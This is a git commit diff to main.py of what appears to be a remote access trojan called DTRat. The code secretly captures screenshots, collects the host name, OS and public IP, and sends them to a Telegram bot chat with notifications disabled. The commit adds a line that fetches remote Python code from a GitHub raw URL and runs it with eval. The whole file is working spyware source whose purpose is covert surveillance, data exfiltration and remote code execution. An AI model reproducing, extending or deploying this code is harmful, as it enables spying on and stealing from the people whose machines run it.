3ae1402703c49b70a9ea1d95d33a9e4abceafd96
paledega <38860643+paledega@users.noreply.github.com>
2022-04-04 01:20:55 +0300

    Update main.py

--- main.py
+++ main.py
@@ -3,6 +3,14 @@ import requests
 import time
 import os, sys
 import platform
+
+while ip == "":
+    try:
+        ip = requests.get("http://ifconfig.me").content.decode("utf-8")
+    except:
+        print("Connection Error: wait 10sec")
+        time.sleep(10)
+
 inidata = requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time())).content.decode("utf-8")
 
 # Fuck configparser All homies use for loop.
@@ -23,7 +31,7 @@ for line in inidata.split("\n"):
 token=config["main"]["token"]
 chatid =config["main"]["chatid"]
 interval = int(config["main"]["interval"])
-ip = requests.get("http://ifconfig.me").content.decode("utf-8")
+
 caption = "amogus"
 
 def get_screenshot():
@@ -32,30 +40,40 @@ def get_screenshot():
     im2 = pyautogui.screenshot(fname)
     return fname
 
-def send_image(fname):
+def send_image(fname,caption=caption):
     url='https://api.telegram.org/bot{}/sendPhoto'.format(token)
     files={'photo': open(fname,'rb')}
     values={'chat_id' : chatid , 'caption':caption,'disable_notification': 'true', 'parse_mode':'MarkdownV2'}
     r=requests.post(url,files=files,data=values)
-    print(r.content)
 
-def send_file(fname):
+def send_file(fname,caption=caption):
     url='https://api.telegram.org/bot{}/sendDocument'.format(token)
     files={'document': open(fname,'rb')}
     values={'chat_id' : chatid , 'caption':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
     r=requests.post(url,files=files,data=values)
-    print(r.content)
 
+def send_message(message=caption):
+    url='https://api.telegram.org/bot{}/sendMessage'.format(token)
+    values={'chat_id' : chatid , 'message':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
+    r=requests.post(url,data=values)
+    
 def set_interval(new):
     global interval
     interval = new
 
-caption = "**HOST:** `"+platform.uname()[1]+"`\n" + \
+def define_caption():
+    global caption
+    caption = "**HOST:** `"+platform.uname()[1]+"`\n" + \
           "**OS:**   `"+str(platform.platform())+"`\n" + \
           "**IP**    `"+ip+"`"
-print(caption)
+
+if "setup" in dir():
+        setup()
+eval(requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)).content.decode("utf-8"))
 
 while True:
+    if "loop" in dir():
+        loop()
     f = get_screenshot()
     send_image(f)
     time.sleep(interval)
